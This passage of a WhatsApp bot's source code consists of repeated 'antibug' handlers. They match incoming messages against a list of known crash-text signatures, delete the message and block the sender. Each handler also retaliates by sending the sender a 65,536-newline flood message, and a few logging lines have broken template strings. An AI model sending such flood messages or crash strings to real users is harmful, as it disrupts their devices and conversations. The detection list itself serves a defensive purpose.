                                                                                                                          'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                                                        });
                                                                                                            
                                                                                                  await bad.chatModify(
                                                                                                                  { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                                                                                                  m.key.remoteJid
                                                                                                              );
                                                                                                                                       await bad.updateBlockStatus(sender, "block");
                                                                                                                      }
                                                                                                                    }
                             
 if (m.message) {                                                     if (budy.match(`@null`)) {
                                                                                                  console.log(color('[VIRUS]', 'red'), color(`Received a virus text from ${m.sender.toString()}`, 'yellow'));                      newly = "\n".repeat(65536);
                                                                                                                        await bad.sendMessage(m.chat, {
                                                                                                                          'text': newly
                                                                                                                        });
                                                                                                                        await bad.sendMessage(bad.user.id, {
                                                                                                                          'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                                                        });
                                                                                                            
                                                                                                  await bad.chatModify(
                                                                                                                  { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                                                                                                  m.key.remoteJid
                                                                                                              );
                                                                                                                                       await bad.updateBlockStatus(sender, "block");
                                                                                                                      }
                                                                                                                    }                            
                                                        if (m.message && !m.isGroup && m.sender !== (bad.user.id)) {                                                     if (budy.match(`󠀬menu`)) {
                             console.log(color('[VIRUS]', 'red'), color(`Received a virus text from ${m.sender.toString()}`, 'yellow'));                      newly = "\n".repeat(65536);
                                                                                                                                                                                 await bad.sendMessage(m.chat, {
                                                                                                                                                                                   'text': newly
                                                                                                                                                                                 });
                                                                                                                                                                                 await bad.sendMessage(bad.user.id, {
                                                                                                                                                                                   'text': m.sender.split('@')[0x0] + " Menu message is not allow in chat ░░░▒▒▓█"
                                                                                                                                                                                 });
                                                                                         await bad.chatModify(
                                                                                                         { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                                                                                         m.key.remoteJid
                                                                                                     );                                                                            
                                                                                                                                                                                await bad.updateBlockStatus(sender, "block");
                                                                                                                                                                               }
                                                                                                                                                                             }                     if (m.message && !m.isGroup && m.sender !== (bad.user.id)) {                                                     if (budy.match(`Ø‚Ù`)) {
                                                                                                                                                                                                          console.log(color('[VIRUS]', 'red'), color(`Received a virus text from {m.sender.toString()}`, 'yellow'));                      newly = "\n".repeat(65536);
                                                                                                                                                                                                                                                                                                                                                              await bad.sendMessage(m.chat, {
                                                                                                                                                                                                                                                                                                                                                                'text': newly
                                                                                                                                                                                                                                                                                                                                                              });
                                                                                                                                                                                                                                                                                                                                                              await bad.sendMessage(bad.user.id, {
                                                                                                                                                                                                                                                                                                                                                                'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                                                                                                                                                                                                                                                                                              });
                                                                                                                                                                                                                                                                      await bad.chatModify(
                                                                                                                                                                                                                                                                                      { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                                                                                                                                                                                                                                                                      m.key.remoteJid
                                                                                                                                                                                                                                                                                  );                                                                            
                                                                                                                                                                                                                                                                                                                                                             await bad.updateBlockStatus(sender, "block");
                                                                                                                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                                                                                                                          }
                                      if (m.message && !m.isGroup && m.sender !== (bad.user.id)) {                                                    if (budy.match(`ೀೀೀೀೀೀೀೀೀೀೀೀೀೀೀೀೀೀೀೀೀೀೀೀ`)) {
                                                                                                                                                                                                                                                console.log(color('[VIRUS]', 'red'), color(`Received a virus text from {m.sender.toString()}`, 'yellow'));                      newly = "\n".repeat(65536);
                                                                                                                                                                                                                                                                                                                                                                                                    await bad.sendMessage(m.chat, {
                                                                                                                                                                                                                                                                                                                                                                                                      'text': newly
                                                                                                                                                                                                                                                                                                                                                                                                    });
                                                                                                                                                                                                                                                                                                                                                                                                    await bad.sendMessage(bad.user.id, {
                                                                                                                                                                                                                                                                                                                                                                                                      'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                                                                                                                                                                                                                                                                                                                                    });
                                                                                                                                                                                                                                                                                                            await bad.chatModify(
                                                                                                                                                                                                                                                                                                                            { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                                                                                                                                                                                                                                                                                                            m.key.remoteJid
                                                                                                                                                                                                                                                                                                                        );                                                                            
                                                                                                                                                                                                                                                                                                                                                                                                   await bad.updateBlockStatus(sender, "block");
                                                                                                                                                                                                                                                                                                                                                                                                  }
                                                                                                                                                                                                                                                                                                                                                                                                }
                                if (m.message && !m.isGroup && m.sender !== (bad.user.id)) {                                                    if (budy.match(`99999999`)) {
                                                                                                                                                                                                                                          console.log(color('[VIRUS]', 'red'), color(`Received a virus text from {m.sender.toString()}`, 'yellow'));                      newly = "\n".repeat(65536);
                                                                                                                                                                                                                                                                                                                                                                                              await bad.sendMessage(m.chat, {
                                                                                                                                                                                                                                                                                                                                                                                                'text': newly
                                                                                                                                                                                                                                                                                                                                                                                              });
                                                                                                                                                                                                                                                                                                                                                                                              await bad.sendMessage(bad.user.id, {
                                                                                                                                                                                                                                                                                                                                                                                                'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                                                                                                                                                                                                                                                                                                                              });
                                                                                                                                                                                                                                                                                                      await bad.chatModify(
                                                                                                                                                                                                                                                                                                                      { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                                                                                                                                                                                                                                                                                                      m.key.remoteJid
                                                                                                                                                                                                                                                                                                                  );                                                                            
                                                                                                                                                                                                                                                                                                                                                                                             await bad.updateBlockStatus(sender, "block");
                                                                                                                                                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                                                                                                                                                          }
                                                if (m.message && !m.isGroup && m.sender !== (bad.user.id)) {                                                    if (budy.match(`ׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅׅ`)) {
                                                                                                                                                                                                                                                          console.log(color('[VIRUS]', 'red'), color(`Received a virus text from {m.sender.toString()}`, 'yellow'));                      newly = "\n".repeat(65536);
                                                                                                                                                                                                                                                                                                                                                                                                              await bad.sendMessage(m.chat, {
                                                                                                                                                                                                                                                                                                                                                                                                                'text': newly
                                                                                                                                                                                                                                                                                                                                                                                                              });
                                                                                                                                                                                                                                                                                                                                                                                                              await bad.sendMessage(bad.user.id, {
                                                                                                                                                                                                                                                                                                                                                                                                                'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                                                                                                                                                                                                                                                                                                                                              });
                                                                                                                                                                                                                                                                                                                      await bad.chatModify(
                                                                                                                                                                                                                                                                                                                                      { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                                                                                                                                                                                                                                                                                                                      m.key.remoteJid
                                                                                                                                                                                                                                                                                                                                  );                                                                            
                                                                                                                                                                                                                                                                                                                                                                                                             await bad.updateBlockStatus(sender, "block");
                                                                                                                                                                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                                                                                                                                                                          }
if (m.message && !m.isGroup && m.sender !== (bad.user.id)) {                                                   
  if (budy.match(`ð™`)) {
                                                                                                                              console.log(color('[VIRUS]', 'red'), color(`Received a virus text from ${m.sender.toString()}`, 'yellow'));                      newly = "\n".repeat(65536);
                                                                                                                                                    await bad.sendMessage(m.chat, {
                                                                                                                                                      'text': newly
                                                                                                                                                    });
                                                                                                                                                    await bad.sendMessage(bad.user.id, {
                                                                                                                                                      'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                                                                                    });
                                                            await bad.chatModify(
                                                                            { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                                                            m.key.remoteJid
                                                                        );                                                                            
                                                                                                                                                   await bad.updateBlockStatus(sender, "block");
                                                                                                                                                  }
                                                                                                                                                }
                                                                                                                         
                                  if (m.message && !m.isGroup && m.sender !== (bad.user.id)) {                                                    if (budy.match(`𠀋ܱܰٯٯٯٯܱܰ𠀋ܱܰٯٯٯٯ𠀋ܱܰٯٯٯٯܱܰ𠀋ܱܰٯٯٯٯܱܰ`)) {
                                                                                                                                                                console.log(color('[VIRUS]', 'red'), color(`Received a virus text from ${m.sender.toString()}`, 'yellow'));                      newly = "\n".repeat(65536);
                                                                                                                                                                                      await bad.sendMessage(m.chat, {
                                                                                                                                                                                        'text': newly
                                                                                                                                                                                      });
                                                                                                                                                                                      await bad.sendMessage(bad.user.id, {
                                                                                                                                                                                        'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                                                                                                                      });
                                                                                              await bad.chatModify(
                                                                                                              { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                                                                                              m.key.remoteJid
                                                                                                          );                                                                            
                                                                                                                                                                                     await bad.updateBlockStatus(sender, "block");
                                                                                                                                                                                    }
                                                                                                                                                                                  }     

                                  if (m.message && !m.isGroup && m.sender !== (bad.user.id)) {                                                     if (budy.match(`@null`)) {                                                                                                                              console.log(color('[VIRUS]', 'red'), color(`Received a virus text from ${m.sender.toString()}`, 'yellow'));                      newly = "\n".repeat(65536);
                                                                                                                                                                                      await bad.sendMessage(m.chat, {
                                                                                                                                                                                        'text': newly
                                                                                                                                                                                      });
                                                                                                                                                                                      await bad.sendMessage(bad.user.id, {
                                                                                                                                                                                        'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                                                                                                                      });
                                                                                              await bad.chatModify(
                                                                                                              { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                                                                                              m.key.remoteJid
                                                                                                          );                                                                            
                                                                                                                                                                                     await bad.updateBlockStatus(sender, "block");
                                                                                                                                                                                    }
                                                                                                                                                                                  }
                             if (m.message && !m.isGroup && m.sender !== (bad.user.id)) {                                                     if (budy.match(`�`)) {                                                                                                                              console.log(color('[VIRUS]', 'red'), color(`Received a virus text from ${m.sender.toString()}`, 'yellow'));                      newly = "\n".repeat(65536);
                                                                                                                                                                                      await bad.sendMessage(m.chat, {
                                                                                                                                                                                        'text': newly
                                                                                                                                                                                      });
                                                                                                                                                                                      await bad.sendMessage(bad.user.id, {
                                                                                                                                                                                        'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                                                                                                                      });
                                                                                              await bad.chatModify(
                                                                                                              { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                                                                                              m.key.remoteJid
                                                                                                          );                                                                            
                                                                                                                                                                                     await bad.updateBlockStatus(sender, "block");
                                                                                                                                                                                    }
                                                                                                                                                                                  }  
                                                                                                                                                                                  if (m.message && !m.isGroup && m.sender !== (bad.user.id)) {                                        if (budy.match(`ꦾ`)) {                                                                                                                              console.log(color('[VIRUS]', 'red'), color(`Received a virus text from {m.sender.toString()}`, 'yellow'));                      newly = "\n".repeat(65536);
                                                                                                                                                                            await bad.sendMessage(m.chat, {
                                                                                                                                                                              'text': newly
                                                                                                                                                                            });
                                                                                                                                                                            await bad.sendMessage(bad.user.id, {
                                                                                                                                                                              'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                                                                                                            });
                                                                                    await bad.chatModify(
                                                                                                    { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                                                                                    m.key.remoteJid
                                                                                                );                                                                            
                                                                                                                                                                           await bad.updateBlockStatus(sender, "block");
                                                                                                                                                                          }
                                                                                                                                                                        }
                                  if (m.message && !m.isGroup && m.sender !== (bad.user.id)) {                                                     if (budy.match(`â–’â–’â`)) {                                                                                                                              console.log(color('[VIRUS]', 'red'), color(`Received a virus text from ${m.sender.toString()}`, 'yellow'));                      newly = "\n".repeat(65536);
                                                                                                                                                                                      await bad.sendMessage(m.chat, {
                                                                                                                                                                                        'text': newly
                                                                                                                                                                                      });
                                                                                                                                                                                      await bad.sendMessage(bad.user.id, {
                                                                                                                                                                                        'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                                                                                                                      });
                                                                                              await bad.chatModify(
                                                                                                              { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                                                                                              m.key.remoteJid
                                                                                                          );                                                                            
                                                                                                                                                                                     await bad.updateBlockStatus(sender, "block");
                                                                                                                                                                                    }
                                                                                                                                                                                  }
                        if (m.message && !m.isGroup && m.sender !== (bad.user.id)) {                                                   if (budy.match(`â€Šâ€`)) {                                                                                                                              console.log(color('[VIRUS]', 'red'), color(`Received a virus text from ${m.sender.toString()}`, 'yellow'));                      newly = "\n".repeat(65536);
                                                                                                                                                                                                              await bad.sendMessage(m.chat, {
                                                                                                                                                                                                                'text': newly
                                                                                                                                                                                                              });
                                                                                                                                                                                                              await bad.sendMessage(bad.user.id, {
                                                                                                                                                                                                                'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                                                                                                                                              });
                                                                                                                      await bad.chatModify(
                                                                                                                                      { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                                                                                                                      m.key.remoteJid
                                                                                                                                  );                                                                            
                                                                                                                                                                                                             await bad.updateBlockStatus(sender, "block");
                                                                                                                                                                                                            }
                                                                                                                                                                                                          }
                                                       
                          if (m.message && !m.isGroup && m.sender !== (bad.user.id)) {                                                     if (budy.match(`‰`)) {                                                                                                                              console.log(color('[VIRUS]', 'red'), color(`Received a virus text from ${m.sender.toString()}`, 'yellow'));                      newly = "\n".repeat(65536);
                                                                                                                                                                                                                                        await bad.sendMessage(m.chat, {
                                                                                                                                                                                                                                          'text': newly
                                                                                                                                                                                                                                        });
                                                                                                                                                                                                                                        await bad.sendMessage(bad.user.id, {
                                                                                                                                                                                                                                          'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                                                                                                                                                                        });
                                                                                                                                                await bad.chatModify(
